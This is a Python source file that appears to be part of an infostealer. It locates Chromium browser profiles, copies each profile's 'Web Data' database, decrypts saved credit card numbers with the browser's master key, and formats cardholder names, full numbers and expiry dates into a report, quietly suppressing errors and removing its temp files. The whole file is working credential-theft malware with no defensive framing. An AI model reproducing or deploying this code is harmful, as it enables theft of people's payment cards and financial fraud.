import os
import tempfile
import shutil
import sqlite3
import json
from .utils import get_master_key, DecryptValue, get_all_browser_profiles, load_json_config, expand_path

def extract_credit_cards():
    cards = []
    browser_config = load_json_config("browser.json")
    
    for browser in browser_config.get("chromium_browsers", []):
        browser_path = expand_path(browser["path"])
        browser_name = browser["name"]
        
        if not os.path.exists(browser_path):
            continue
            
        master_key = get_master_key(browser_path)
        if not master_key:
            continue
            
        profiles = get_all_browser_profiles(browser_path)
        for profile in profiles:
            web_data = os.path.join(browser_path, profile, "Web Data")
            if not os.path.exists(web_data):
                continue
                
            temp_db = os.path.join(tempfile.gettempdir(), f"WebData_{browser_name}_{profile}_{os.getpid()}.db")
            try:
                shutil.copy2(web_data, temp_db)
                conn = sqlite3.connect(temp_db, timeout=5)
                cursor = conn.cursor()
                
                cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
                
                for row in cursor.fetchall():
                    name, exp_month, exp_year, encrypted_num = row
                    if encrypted_num:
                        decrypted_num = DecryptValue(encrypted_num, master_key)
                        if decrypted_num:
                            cards.append({
                                "browser": browser_name,
                                "profile": profile,
                                "name": name,
                                "number": decrypted_num,
                                "expiry": f"{exp_month}/{exp_year}"
                            })
                
                cursor.close()
                conn.close()
            except:
                pass
            finally:
                if os.path.exists(temp_db):
                    try: os.remove(temp_db)
                    except: pass
    return cards

def get_cc_report():
    cards = extract_credit_cards()
    if not cards:
        return None
        
    report = "╔════════════════════════════════════════╗\n"
    report += "║             CREDIT CARDS               ║\n"
    report += "╠════════════════════════════════════════╣\n"
    for card in cards:
        report += f"║ NAME: {str(card['name']).ljust(32)} ║\n"
        report += f"║ CARD: {str(card['number']).ljust(32)} ║\n"
        report += f"║ EXP:  {str(card['expiry']).ljust(32)} ║\n"
        report += "╠════════════════════════════════════════╣\n"
    report += "╚════════════════════════════════════════╝"
    return report
